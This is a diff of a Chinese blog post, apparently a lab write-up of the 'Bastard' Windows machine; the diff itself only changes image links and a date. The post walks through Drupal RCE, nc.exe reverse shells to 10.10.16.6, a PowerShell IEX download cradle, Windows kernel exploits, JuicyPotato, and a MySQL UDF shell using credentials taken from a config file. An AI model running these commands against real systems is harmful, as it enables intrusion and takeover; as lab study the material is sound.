@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fyhypo.github.io/img/Bastard.jpg">
 <meta property="article:published_time" content="2024-08-31T14:30:16.480Z">
-<meta property="article:modified_time" content="2024-08-31T14:30:16.480Z">
+<meta property="article:modified_time" content="2024-09-03T03:15:31.896Z">
 <meta property="article:author" content="FYHypo">
 <meta property="article:tag" content="pentest">
 <meta name="twitter:card" content="summary_large_image">
@@ -279,36 +279,36 @@
             
               <div class="markdown-body">
                 
-                <p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810111047.png" srcset="/img/loading.gif" lazyload></p>
+                <p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810111047.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>从ping结果的ttl&#x3D;127也能看出是windows机器</p>
 </blockquote>
 <h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT --min-rate 10000 -p- 10.129.22.66 -oA nmapscan/ports<br>nmap -sU --top-ports 20 10.129.22.66 -oA nmapscan/udp<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810110955.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810111014.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810110955.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810111014.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>http、rpc、未知</p>
 </blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sC -sV -O -p80,135,49154 10.129.22.66 -oA nmapscan/detail<br>nmap --script=vuln -p80,135,49154 10.129.22.66 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810111717.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810111717.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>两个rpc、一个drupal的iis7.5 web服务</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810121818.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810111621.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810121818.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810111621.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>Drupal的默认页</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810112455.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810112536.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810112455.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810112536.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>drupal7.5，寻找nday</p>
 </blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#去掉msf和拒绝服务的结果</span><br>searchsploit drupal --exclude=<span class="hljs-string">&quot;(Metasploit)|Denial of Service&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810113035.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810113035.png" srcset="/img/loading.gif" lazyload></p>
 <p><strong>Drupal</strong>：</p>
 <ol>
 <li>Drupal 7.x Module Services - Remote Code Execution，通过注入可以写shell、拿管理员cookie、密码哈希；</li>
@@ -322,83 +322,83 @@
 <blockquote>
 <p>考虑到利用条件等原因，按如下顺序测试：</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810113339.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810113339.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>vim先看41564：</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810113505.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810113505.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>根据靶机对初始信息修改</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810113824.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810120545.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810113824.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810120545.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>再次查看初始信息设置，大概率是endpoint路径非默认，需要修改</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810120937.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810120937.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>exp中给了出处blog，作者也说需要知道endpoint的路径</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810114717.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810121127.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810114717.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810121127.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>个人感觉可以理解为有rest风格的rpc</p>
 </blockquote>
 <p>目录爆破找endpoint路径，字典选择针对restful的endpoints的字典：</p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810122306.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810122306.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>&#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;api&#x2F;api-endpoints-res.txt</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810160259.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810160259.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://10.129.246.12/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -t 50 -e -s 200<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810160535.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810160535.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>成功rce，接着用smb的nc拿反弹Shell：</p>
 </blockquote>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">smbserver.py share .<br>\\\\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>\share\nc.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810161901.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810161901.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell &quot;(New-Object System.<span class="hljs-built_in">Net</span>.WebClient).Downloadfile(&#x27;http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>:<span class="hljs-number">8000</span>/winpeas.exe&#x27;,&#x27;winpeas.exe&#x27;)&quot;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810174543.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810174543.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>winpeas全版本莫名卡住，无法进行，换msf的multi&#x2F;recon&#x2F;local_exploit_suggester：</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810191410.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810191410.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>保存到result后提取模块名到kernel</p>
 </blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> result | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;\n&#x27;</span> | grep <span class="hljs-string">&#x27;^exploit/&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; kernel<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810192214.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240810200301.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810192214.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810200301.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>不知道为什么每个利用都成功了但都没有创建会话</p>
 </blockquote>
 <h3 id="ms10-059"><a href="#ms10-059" class="headerlink" title="ms10-059"></a>ms10-059</h3><p>接着换 windows-exploit-suggester ：</p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811161115.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811161115.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>ms13-005、ms11-011、ms10-073、ms10-059、ms10-047</p>
 </blockquote>
 <p>利用到ms10-059时：</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">.\MS10-<span class="hljs-number">059</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">4445</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811170631.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811170631.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>ms10-059成功，其余均失败</p>
 </blockquote>
 <h3 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h3><p>换sherlock：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://10.10.16.2:8000/Sherlock.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811161813.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811161813.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>ms10-092、ms15-051、ms16-032</p>
 </blockquote>
 <p>利用到ms15-051时：</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ms15-<span class="hljs-number">051</span>_x64.exe whoami<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811172412.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811172412.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>只有ms15-051利用成功</p>
 </blockquote>
@@ -408,41 +408,41 @@
 <h3 id="cve-2018-8120"><a href="#cve-2018-8120" class="headerlink" title="cve-2018-8120"></a>cve-2018-8120</h3><blockquote>
 <p>手工拿操作系统版本搜索</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811174636.png" srcset="/img/loading.gif" lazyload><br><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811174650.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811175106.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811174636.png" srcset="/img/loading.gif" lazyload><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811174650.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811175106.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>只有CVE-2010-0020利用成功</p>
 </blockquote>
-<h3 id="juicy-potato"><a href="#juicy-potato" class="headerlink" title="juicy potato"></a>juicy potato</h3><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811181038.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="juicy-potato"><a href="#juicy-potato" class="headerlink" title="juicy potato"></a>juicy potato</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811181038.png" srcset="/img/loading.gif" lazyload></p>
 <p>开启了SeImpersonatePrivilege权限，应当引起重视</p>
 <blockquote>
 <p>首先想到令牌窃取，但缺少SeDebugPrivilege无法完成；<br>接着想到printspoofer，但版本太低对不上；<br>最后考虑到版本很低，选择juicy potato</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811182007.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811182007.png" srcset="/img/loading.gif" lazyload></p>
 <p>大概率可用，<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a></p>
 <blockquote>
 <p>必要的CLSID可查 <a target="_blank" rel="noopener" href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/">https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/</a><br>选择 {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811182605.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811182605.png" srcset="/img/loading.gif" lazyload></p>
 <p>利用前面起的smb中的cmd反弹shell：</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">JuicyPotato.exe -l <span class="hljs-number">1337</span> -p c:\Windows\System32\<span class="hljs-built_in">cmd</span>.exe -t * -c &#123;<span class="hljs-number">9</span>B1F122C-<span class="hljs-number">2982</span>-<span class="hljs-number">4</span>e91-AA8B-E071D54F2A4D&#125; -a &quot;/c \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>\share\nc.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">9999</span>&quot;<br></code></pre></td></tr></table></figure>
 
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811183141.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811183141.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>成功提权</p>
 </blockquote>
 <h3 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h3><blockquote>
 <p>drupal这类cms必有数据库(mysql)，在default&#x2F;connect.php配置文件偷到凭据</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201037.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201125.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201037.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201125.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>root身份，可以尝试udf</p>
 </blockquote>
 <figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">root<br>mysql123!root<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811200212.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811200212.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>即使是msf或nishang的终端仍然交互性不够，索性将3306转发到本地：</p>
 </blockquote>
@@ -450,20 +450,20 @@
 
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">chisel.exe client <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>:<span class="hljs-number">9595</span> R:<span class="hljs-number">3306</span>:localhost:<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201339.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201339.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>验证可用性：</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201713.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201713.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>版本正确、插件路径得到、利用权限正确</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811201939.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201939.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">locate mysqludf<br><span class="hljs-comment">#/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll</span><br></code></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select load_file(&#x27;\\\\10.10.16.6\\share\\lib_mysqludf_sys_64.dll&#x27;) into dumpfile &quot;C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll&quot;;<br><br>create function sys_exec returns string soname &#x27;udf.dll&#x27;;<br><br>select sys_exec(&#x27;\\\\10.10.16.6\\share\\nc.exe -e cmd.exe 10.10.16.6 9999&#x27;);<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240811203148.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811203148.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>除此以外，dll可用不用远程导入，直接hex后给到mysql的unhex导入就行</p>
 </blockquote>
